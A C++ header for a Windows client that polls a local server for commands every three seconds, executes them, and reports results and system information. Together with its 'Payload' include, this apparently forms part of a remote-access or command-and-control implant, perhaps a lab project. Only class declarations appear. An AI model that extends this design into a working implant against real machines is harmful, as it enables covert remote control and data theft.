/*
Acts as the command receiver and executor.
The system maintains real-time communication between the client and server through structured HTTP requests.
*/
#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string>
#include "../Command/NetworkManager.hpp"
#include "../Command/VolumeManager.hpp"
#include "../../Module/Logger.hpp"
#include "../Payload/Payload.hpp"
#include <csignal>
#include <nlohmann/json.hpp>

#pragma comment(lib, "wininet.lib")

class HttpClient {
private:
    const std::string COMMAND_URL = "http://localhost:3000/getcommand";
    const std::string LOG_URL = "http://localhost:3000/log";

    const int CHECK_INTERVAL = 3000;// 3 seconds

    bool is_running;
    std::string last_command;
    nlohmann::json systemInfo;

    std::string getCommand();
    void executeCommand(const std::string& cmd);
    void sendLog(const std::string& cmd, const std::string& result, bool success);
    std::string getCurrentTime();
    static void signalHandler(int signum);

public:
    HttpClient();
    ~HttpClient();
    void initialize(const nlohmann::json& sysInfo);
    void start();
    void stop();
};